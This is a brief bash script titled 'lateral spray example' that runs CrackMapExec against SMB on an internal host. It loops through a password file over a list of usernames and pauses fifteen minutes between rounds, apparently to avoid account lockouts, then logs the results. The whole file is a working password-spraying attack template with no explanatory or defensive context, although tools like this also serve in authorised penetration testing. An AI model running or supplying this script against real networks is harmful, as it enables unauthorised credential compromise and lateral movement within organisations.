#! /usr/bin/bash
# lateral spray example

for p in $(cat pass); do
cme -t 5 --jitter 2 smb 10.100.1.11 -u targnames -p $p | tee -a slowrun
date
sleep 900 ;
done
